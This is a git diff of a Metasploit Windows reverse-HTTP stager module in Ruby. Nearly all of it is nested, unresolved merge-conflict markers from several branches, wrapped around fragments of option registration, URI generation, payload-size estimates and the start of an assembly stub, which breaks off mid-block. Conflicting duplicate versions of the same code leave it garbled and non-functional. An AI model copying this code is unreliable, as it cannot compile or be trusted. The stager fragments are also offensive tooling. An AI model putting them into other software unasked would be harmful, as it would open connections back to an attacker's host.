@@ -7,6 +7,7 @@ require 'msf/core'
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 >>>>>>> 4.11.2_release_pre-rails4
 require 'msf/core/payload/transport_config'
@@ -32,6 +33,10 @@ module Msf
 =======
 >>>>>>> msf-complex-payloads
 =======
+=======
+<<<<<<< HEAD
+>>>>>>> pod/metasploit-gemfile-
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -41,6 +46,10 @@ module Msf
 <<<<<<< HEAD
 =======
 >>>>>>> pod/complex-payloads
+=======
+<<<<<<< HEAD
+<<<<<<< HEAD
+>>>>>>> pod/metasploit-gemfile-
 require 'msf/core/payload/windows/block_api'
 require 'msf/core/payload/windows/exitfunk'
 
@@ -48,6 +57,9 @@ module Msf
 
 
 <<<<<<< HEAD
+<<<<<<< HEAD
+=======
+>>>>>>> pod/metasploit-gemfile-
 =======
 =======
 >>>>>>> rapid7/master
@@ -58,18 +70,30 @@ module Msf
 =======
 >>>>>>> rapid7/master
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 =======
->>>>>>> rapid7/master
-=======
->>>>>>> master
-=======
->>>>>>> master
+>>>>>>> pod/metasploit-gemfile-
 =======
 >>>>>>> rapid7/master
 =======
 >>>>>>> master
+=======
+>>>>>>> master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> master
+<<<<<<< HEAD
 >>>>>>> payload-generator.rb
+=======
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+>>>>>>> pod/metasploit-gemfile-
 require 'msf/core/payload/transport_config'
 require 'msf/core/payload/windows/block_api'
 require 'msf/core/payload/windows/exitfunk'
@@ -82,7 +106,12 @@ module Msf
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
+=======
+<<<<<<< HEAD
+<<<<<<< HEAD
+>>>>>>> pod/metasploit-gemfile-
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -90,7 +119,10 @@ module Msf
 <<<<<<< HEAD
 >>>>>>> rapid7/master
 =======
+<<<<<<< HEAD
 >>>>>>> payload-generator.rb
+=======
+>>>>>>> pod/metasploit-gemfile-
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
@@ -102,10 +134,13 @@ module Msf
 >>>>>>> rapid7/master
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 >>>>>>> msf-complex-payloads
 =======
 >>>>>>> msf-complex-payloads
 =======
+=======
+>>>>>>> pod/metasploit-gemfile-
 =======
 >>>>>>> master
 =======
@@ -114,9 +149,18 @@ module Msf
 >>>>>>> rapid7/master
 =======
 >>>>>>> master
+<<<<<<< HEAD
 >>>>>>> payload-generator.rb
 =======
 >>>>>>> pod/complex-payloads
+=======
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+>>>>>>> pod/metasploit-gemfile-
 ###
 #
 # Complex payload generation for Windows ARCH_X86 that speak HTTP(S)
@@ -129,6 +173,7 @@ module Msf
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 >>>>>>> 4.11.2_release_pre-rails4
 =======
@@ -136,11 +181,17 @@ module Msf
 =======
 >>>>>>> msf-complex-payloads
 =======
+=======
+<<<<<<< HEAD
+>>>>>>> pod/metasploit-gemfile-
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> payload-generator.rb
+=======
+>>>>>>> pod/metasploit-gemfile-
 <<<<<<< HEAD
 <<<<<<< HEAD
 
@@ -159,9 +210,11 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 >>>>>>> msf-complex-payloads
 =======
 >>>>>>> msf-complex-payloads
+=======
 =======
 =======
 >>>>>>> rapid7/master
@@ -169,11 +222,24 @@ module Payload::Windows::ReverseHttp
 >>>>>>> master
 =======
 >>>>>>> master
+>>>>>>> pod/metasploit-gemfile-
 =======
+>>>>>>> rapid7/master
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+=======
+<<<<<<< HEAD
 >>>>>>> rapid7/master
 =======
 >>>>>>> master
 >>>>>>> payload-generator.rb
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+>>>>>>> pod/metasploit-gemfile-
 module Payload::Windows::ReverseHttp
 
   include Msf::Payload::TransportConfig
@@ -181,6 +247,7 @@ module Payload::Windows::ReverseHttp
   include Msf::Payload::Windows::BlockApi
   include Msf::Payload::Windows::Exitfunk
   include Msf::Payload::UUID::Options
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -202,11 +269,18 @@ module Payload::Windows::ReverseHttp
 =======
 >>>>>>> msf-complex-payloads
 =======
+=======
+<<<<<<< HEAD
+<<<<<<< HEAD
+>>>>>>> pod/metasploit-gemfile-
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> payload-generator.rb
+=======
+>>>>>>> pod/metasploit-gemfile-
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> rapid7/master
@@ -218,6 +292,7 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> msf-complex-payloads
@@ -225,18 +300,29 @@ module Payload::Windows::ReverseHttp
 >>>>>>> msf-complex-payloads
 =======
 =======
->>>>>>> rapid7/master
-=======
->>>>>>> master
-=======
->>>>>>> master
+>>>>>>> pod/metasploit-gemfile-
 =======
 >>>>>>> rapid7/master
 =======
 >>>>>>> master
+=======
+>>>>>>> master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> master
+<<<<<<< HEAD
 >>>>>>> payload-generator.rb
 =======
 >>>>>>> pod/complex-payloads
+=======
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+>>>>>>> pod/metasploit-gemfile-
 
   #
   # Register reverse_http specific options
@@ -249,6 +335,7 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 >>>>>>> 4.11.2_release_pre-rails4
 =======
@@ -256,11 +343,17 @@ module Payload::Windows::ReverseHttp
 =======
 >>>>>>> msf-complex-payloads
 =======
+=======
+<<<<<<< HEAD
+>>>>>>> pod/metasploit-gemfile-
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> payload-generator.rb
+=======
+>>>>>>> pod/metasploit-gemfile-
 <<<<<<< HEAD
 <<<<<<< HEAD
     register_advanced_options(
@@ -277,9 +370,11 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 >>>>>>> msf-complex-payloads
 =======
 >>>>>>> msf-complex-payloads
+=======
 =======
 =======
 >>>>>>> rapid7/master
@@ -287,11 +382,24 @@ module Payload::Windows::ReverseHttp
 >>>>>>> master
 =======
 >>>>>>> master
+>>>>>>> pod/metasploit-gemfile-
 =======
+>>>>>>> rapid7/master
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+=======
+<<<<<<< HEAD
 >>>>>>> rapid7/master
 =======
 >>>>>>> master
 >>>>>>> payload-generator.rb
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+>>>>>>> pod/metasploit-gemfile-
     register_advanced_options([
         OptInt.new('StagerURILength', [false, 'The URI length for the stager (at least 5 bytes)']),
         OptInt.new('StagerRetryCount', [false, 'The number of times the stager should retry if the first connect fails', 10]),
@@ -300,6 +408,7 @@ module Payload::Windows::ReverseHttp
         OptString.new('PayloadProxyUser', [false, 'An optional proxy server username']),
         OptString.new('PayloadProxyPass', [false, 'An optional proxy server password']),
         OptEnum.new('PayloadProxyType', [false, 'The type of HTTP proxy (HTTP or SOCKS)', 'HTTP', ['HTTP', 'SOCKS']])
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -313,11 +422,18 @@ module Payload::Windows::ReverseHttp
 =======
 >>>>>>> msf-complex-payloads
 =======
+=======
+<<<<<<< HEAD
+>>>>>>> pod/metasploit-gemfile-
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> payload-generator.rb
+=======
+<<<<<<< HEAD
+>>>>>>> pod/metasploit-gemfile-
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -330,6 +446,7 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> msf-complex-payloads
@@ -337,27 +454,39 @@ module Payload::Windows::ReverseHttp
 >>>>>>> msf-complex-payloads
 =======
 =======
->>>>>>> rapid7/master
-=======
->>>>>>> master
-=======
->>>>>>> master
+>>>>>>> pod/metasploit-gemfile-
 =======
 >>>>>>> rapid7/master
 =======
 >>>>>>> master
+=======
+>>>>>>> master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> master
+<<<<<<< HEAD
 >>>>>>> payload-generator.rb
 =======
     register_advanced_options(
       [
         OptInt.new('HTTPStagerURILength', [false, 'The URI length for the stager (5 to 240ish bytes)'])
 >>>>>>> pod/complex-payloads
+=======
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+>>>>>>> pod/metasploit-gemfile-
       ], self.class)
   end
 
   #
   # Generate the first stage
   #
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -398,6 +527,10 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 >>>>>>> msf-complex-payloads
 =======
+=======
+<<<<<<< HEAD
+>>>>>>> pod/metasploit-gemfile-
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -407,6 +540,8 @@ module Payload::Windows::ReverseHttp
 >>>>>>> payload-generator.rb
 =======
 >>>>>>> pod/complex-payloads
+=======
+>>>>>>> pod/metasploit-gemfile-
   def generate
     # Generate the simple version of this stager if we don't have enough space
     if self.available_space.nil? || required_space > self.available_space
@@ -429,6 +564,7 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 >>>>>>> feature/complex-payloads
 =======
 =======
@@ -437,18 +573,24 @@ module Payload::Windows::ReverseHttp
 =======
 =======
 =======
+>>>>>>> pod/metasploit-gemfile-
+=======
 =======
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+<<<<<<< HEAD
 >>>>>>> payload-generator.rb
 =======
->>>>>>> rapid7/master
+>>>>>>> pod/metasploit-gemfile-
 =======
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
 =======
+>>>>>>> rapid7/master
+=======
+<<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> rapid7/master
 <<<<<<< HEAD
@@ -461,9 +603,22 @@ module Payload::Windows::ReverseHttp
 >>>>>>> master
 =======
 >>>>>>> rapid7/master
+>>>>>>> pod/metasploit-gemfile-
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+=======
+<<<<<<< HEAD
+>>>>>>> rapid7/master
 =======
 >>>>>>> master
 >>>>>>> payload-generator.rb
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+>>>>>>> pod/metasploit-gemfile-
   def generate(opts={})
     conf = {
       ssl:         opts[:ssl] || false,
@@ -490,17 +645,25 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 >>>>>>> 4.11.2_release_pre-rails4
 =======
 <<<<<<< HEAD
 =======
 >>>>>>> msf-complex-payloads
 =======
+=======
+<<<<<<< HEAD
+>>>>>>> pod/metasploit-gemfile-
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> payload-generator.rb
+=======
+<<<<<<< HEAD
+>>>>>>> pod/metasploit-gemfile-
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -513,6 +676,7 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> msf-complex-payloads
@@ -520,18 +684,29 @@ module Payload::Windows::ReverseHttp
 >>>>>>> msf-complex-payloads
 =======
 =======
->>>>>>> rapid7/master
-=======
->>>>>>> master
-=======
->>>>>>> master
+>>>>>>> pod/metasploit-gemfile-
 =======
 >>>>>>> rapid7/master
 =======
 >>>>>>> master
+=======
+>>>>>>> master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> master
+<<<<<<< HEAD
 >>>>>>> payload-generator.rb
 =======
 >>>>>>> pod/complex-payloads
+=======
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+>>>>>>> pod/metasploit-gemfile-
     generate_reverse_http(conf)
   end
 
@@ -555,6 +730,7 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
   #
   # Generate the transport-specific configuration
   #
@@ -572,11 +748,17 @@ module Payload::Windows::ReverseHttp
 =======
 >>>>>>> msf-complex-payloads
 =======
+=======
+<<<<<<< HEAD
+>>>>>>> pod/metasploit-gemfile-
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> payload-generator.rb
+=======
+>>>>>>> pod/metasploit-gemfile-
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -594,9 +776,11 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 >>>>>>> msf-complex-payloads
 =======
 >>>>>>> msf-complex-payloads
+=======
 =======
 =======
 >>>>>>> rapid7/master
@@ -604,11 +788,24 @@ module Payload::Windows::ReverseHttp
 >>>>>>> master
 =======
 >>>>>>> master
+>>>>>>> pod/metasploit-gemfile-
 =======
+>>>>>>> rapid7/master
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+=======
+<<<<<<< HEAD
 >>>>>>> rapid7/master
 =======
 >>>>>>> master
 >>>>>>> payload-generator.rb
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+>>>>>>> pod/metasploit-gemfile-
   #
   # Generate the transport-specific configuration
   #
@@ -617,16 +814,24 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 <<<<<<< HEAD
 =======
 >>>>>>> msf-complex-payloads
 =======
+=======
+<<<<<<< HEAD
+>>>>>>> pod/metasploit-gemfile-
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> payload-generator.rb
+=======
+<<<<<<< HEAD
+>>>>>>> pod/metasploit-gemfile-
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -639,6 +844,7 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> msf-complex-payloads
@@ -646,21 +852,32 @@ module Payload::Windows::ReverseHttp
 >>>>>>> msf-complex-payloads
 =======
 =======
->>>>>>> rapid7/master
-=======
->>>>>>> master
-=======
->>>>>>> master
+>>>>>>> pod/metasploit-gemfile-
 =======
 >>>>>>> rapid7/master
 =======
 >>>>>>> master
+=======
+>>>>>>> master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> master
+<<<<<<< HEAD
 >>>>>>> payload-generator.rb
 =======
   # TODO: Use the CachedSize instead (PR #4894)
   def cached_size
     321
 >>>>>>> pod/complex-payloads
+=======
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+>>>>>>> pod/metasploit-gemfile-
   end
 
   #
@@ -672,11 +889,16 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 <<<<<<< HEAD
 =======
 >>>>>>> msf-complex-payloads
 =======
+=======
+<<<<<<< HEAD
+>>>>>>> pod/metasploit-gemfile-
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -687,6 +909,11 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 =======
 >>>>>>> pod/complex-payloads
+=======
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+>>>>>>> pod/metasploit-gemfile-
     # Maximum URL is limited to https:// plus 256 bytes, figure out our maximum URI
     uri_max_len = 256 - "#{datastore['LHOST']}:#{datastore['LPORT']}/".length
 
@@ -707,6 +934,9 @@ module Payload::Windows::ReverseHttp
     # Generate a random 30+ byte URI
     "/" + generate_uri_checksum(Msf::Handler::ReverseHttp::URI_CHECKSUM_INITW, 30 + rand(uri_max_len-30))
 <<<<<<< HEAD
+<<<<<<< HEAD
+=======
+>>>>>>> pod/metasploit-gemfile-
 =======
 =======
 >>>>>>> rapid7/master
@@ -718,9 +948,11 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 >>>>>>> msf-complex-payloads
 =======
 >>>>>>> msf-complex-payloads
+=======
 =======
 =======
 >>>>>>> rapid7/master
@@ -728,11 +960,24 @@ module Payload::Windows::ReverseHttp
 >>>>>>> master
 =======
 >>>>>>> master
+>>>>>>> pod/metasploit-gemfile-
 =======
+>>>>>>> rapid7/master
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+=======
+<<<<<<< HEAD
 >>>>>>> rapid7/master
 =======
 >>>>>>> master
 >>>>>>> payload-generator.rb
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+>>>>>>> pod/metasploit-gemfile-
 
     uri_req_len = datastore['StagerURILength'].to_i
 
@@ -756,6 +1001,7 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
     # Maximum URL is limited to https:// plus 256 bytes, figure out our maximum URI
     uri_max_len = 256 - "#{datastore['LHOST']}:#{datastore['LPORT']}/".length
@@ -782,11 +1028,18 @@ module Payload::Windows::ReverseHttp
 =======
 >>>>>>> msf-complex-payloads
 =======
+=======
+<<<<<<< HEAD
+>>>>>>> pod/metasploit-gemfile-
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> payload-generator.rb
+=======
+<<<<<<< HEAD
+>>>>>>> pod/metasploit-gemfile-
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -799,6 +1052,7 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> msf-complex-payloads
@@ -806,18 +1060,29 @@ module Payload::Windows::ReverseHttp
 >>>>>>> msf-complex-payloads
 =======
 =======
->>>>>>> rapid7/master
-=======
->>>>>>> master
-=======
->>>>>>> master
+>>>>>>> pod/metasploit-gemfile-
 =======
 >>>>>>> rapid7/master
 =======
 >>>>>>> master
+=======
+>>>>>>> master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> master
+<<<<<<< HEAD
 >>>>>>> payload-generator.rb
 =======
 >>>>>>> pod/complex-payloads
+=======
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+>>>>>>> pod/metasploit-gemfile-
   end
 
   #
@@ -835,6 +1100,7 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
     # Make room for the maximum possible URL length
     space += 256
 =======
@@ -846,11 +1112,17 @@ module Payload::Windows::ReverseHttp
 =======
 >>>>>>> msf-complex-payloads
 =======
+=======
+<<<<<<< HEAD
+>>>>>>> pod/metasploit-gemfile-
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> payload-generator.rb
+=======
+>>>>>>> pod/metasploit-gemfile-
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -878,10 +1150,13 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 >>>>>>> msf-complex-payloads
 =======
 >>>>>>> msf-complex-payloads
 =======
+=======
+>>>>>>> pod/metasploit-gemfile-
 =======
     # Make room for the maximum possible URL length
     space += 256
@@ -902,11 +1177,26 @@ module Payload::Windows::ReverseHttp
     # Make room for the maximum possible URL length
     space += 256
 >>>>>>> master
+<<<<<<< HEAD
 >>>>>>> payload-generator.rb
 =======
     # Add 251 bytes for large URI support (technically a little less, but lets go with it)
     space += 251
 >>>>>>> pod/complex-payloads
+=======
+=======
+    # Make room for the maximum possible URL length
+    space += 256
+>>>>>>> master
+=======
+    # Make room for the maximum possible URL length
+    space += 256
+>>>>>>> master
+=======
+    # Make room for the maximum possible URL length
+    space += 256
+>>>>>>> master
+>>>>>>> pod/metasploit-gemfile-
 
     # EXITFUNK processing adds 31 bytes at most (for ExitThread, only ~16 for others)
     space += 31
@@ -916,6 +1206,7 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
     # Proxy options?
     space += 200
 
@@ -926,11 +1217,17 @@ module Payload::Windows::ReverseHttp
 =======
 >>>>>>> msf-complex-payloads
 =======
+=======
+<<<<<<< HEAD
+>>>>>>> pod/metasploit-gemfile-
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> payload-generator.rb
+=======
+>>>>>>> pod/metasploit-gemfile-
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -959,6 +1256,7 @@ module Payload::Windows::ReverseHttp
     space += 200
 
 >>>>>>> rapid7/master
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> msf-complex-payloads
@@ -966,20 +1264,7 @@ module Payload::Windows::ReverseHttp
 >>>>>>> msf-complex-payloads
 =======
 =======
-    # Proxy options?
-    space += 200
-
->>>>>>> rapid7/master
-=======
-    # Proxy options?
-    space += 200
-
->>>>>>> master
-=======
-    # Proxy options?
-    space += 200
-
->>>>>>> master
+>>>>>>> pod/metasploit-gemfile-
 =======
     # Proxy options?
     space += 200
@@ -990,9 +1275,42 @@ module Payload::Windows::ReverseHttp
     space += 200
 
 >>>>>>> master
+=======
+    # Proxy options?
+    space += 200
+
+>>>>>>> master
+=======
+    # Proxy options?
+    space += 200
+
+>>>>>>> rapid7/master
+=======
+    # Proxy options?
+    space += 200
+
+>>>>>>> master
+<<<<<<< HEAD
 >>>>>>> payload-generator.rb
 =======
 >>>>>>> pod/complex-payloads
+=======
+=======
+    # Proxy options?
+    space += 200
+
+>>>>>>> master
+=======
+    # Proxy options?
+    space += 200
+
+>>>>>>> master
+=======
+    # Proxy options?
+    space += 200
+
+>>>>>>> master
+>>>>>>> pod/metasploit-gemfile-
     # The final estimated size
     space
   end
@@ -1003,11 +1321,16 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 <<<<<<< HEAD
 =======
 >>>>>>> msf-complex-payloads
 =======
+=======
+<<<<<<< HEAD
+>>>>>>> pod/metasploit-gemfile-
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -1018,6 +1341,11 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 =======
 >>>>>>> pod/complex-payloads
+=======
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+>>>>>>> pod/metasploit-gemfile-
   # Dynamic payload generation
   #
   def asm_reverse_http(opts={})
@@ -1051,6 +1379,9 @@ module Payload::Windows::ReverseHttp
       #;0x00000200   ; INTERNET_FLAG_NO_UI
       http_open_flags = ( 0x80000000 | 0x04000000 | 0x00400000 | 0x00200000 | 0x00000200 )
 <<<<<<< HEAD
+<<<<<<< HEAD
+=======
+>>>>>>> pod/metasploit-gemfile-
 =======
 =======
 >>>>>>> rapid7/master
@@ -1062,9 +1393,11 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 >>>>>>> msf-complex-payloads
 =======
 >>>>>>> msf-complex-payloads
+=======
 =======
 =======
 >>>>>>> rapid7/master
@@ -1072,11 +1405,24 @@ module Payload::Windows::ReverseHttp
 >>>>>>> master
 =======
 >>>>>>> master
+>>>>>>> pod/metasploit-gemfile-
 =======
+>>>>>>> rapid7/master
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+=======
+<<<<<<< HEAD
 >>>>>>> rapid7/master
 =======
 >>>>>>> master
 >>>>>>> payload-generator.rb
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+>>>>>>> pod/metasploit-gemfile-
   # Generate an assembly stub with the configured feature set and options.
   #
   # @option opts [Bool] :ssl Whether or not to enable SSL
@@ -1119,12 +1465,15 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 >>>>>>> msf-complex-payloads
 =======
 >>>>>>> msf-complex-payloads
 =======
 >>>>>>> payload-generator.rb
+=======
+>>>>>>> pod/metasploit-gemfile-
 
     if opts[:ssl]
       http_open_flags = (
@@ -1150,6 +1499,7 @@ module Payload::Windows::ReverseHttp
         0x00400000 | # INTERNET_FLAG_KEEP_CONNECTION
         0x00200000 | # INTERNET_FLAG_NO_AUTO_REDIRECT
         0x00000200 ) # INTERNET_FLAG_NO_UI
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -1210,11 +1560,18 @@ module Payload::Windows::ReverseHttp
 =======
 >>>>>>> msf-complex-payloads
 =======
+=======
+<<<<<<< HEAD
+<<<<<<< HEAD
+>>>>>>> pod/metasploit-gemfile-
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> payload-generator.rb
+=======
+>>>>>>> pod/metasploit-gemfile-
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -1227,6 +1584,7 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> msf-complex-payloads
@@ -1234,22 +1592,34 @@ module Payload::Windows::ReverseHttp
 >>>>>>> msf-complex-payloads
 =======
 =======
->>>>>>> rapid7/master
-=======
->>>>>>> master
-=======
->>>>>>> master
+>>>>>>> pod/metasploit-gemfile-
 =======
 >>>>>>> rapid7/master
 =======
 >>>>>>> master
+=======
+>>>>>>> master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> master
+<<<<<<< HEAD
 >>>>>>> payload-generator.rb
 =======
 >>>>>>> pod/complex-payloads
+=======
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+>>>>>>> pod/metasploit-gemfile-
     end
 
     asm = %Q^
       ;-----------------------------------------------------------------------------;
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -1275,6 +1645,10 @@ module Payload::Windows::ReverseHttp
 =======
 >>>>>>> msf-complex-payloads
 =======
+=======
+<<<<<<< HEAD
+>>>>>>> pod/metasploit-gemfile-
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -1285,6 +1659,11 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 =======
 >>>>>>> pod/complex-payloads
+=======
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+>>>>>>> pod/metasploit-gemfile-
       ; Author: HD Moore
       ; Compatible: Confirmed Windows 7, Windows 2008 Server, Windows XP SP1, Windows SP3, Windows 2000
       ; Known Bugs: Incompatible with Windows NT 4.0, buggy on Windows XP Embedded (SP1)
@@ -1294,6 +1673,9 @@ module Payload::Windows::ReverseHttp
       ; Input: EBP must be the address of 'api_call'.
       ; Output: EDI will be the socket for the connection to the server
 <<<<<<< HEAD
+<<<<<<< HEAD
+=======
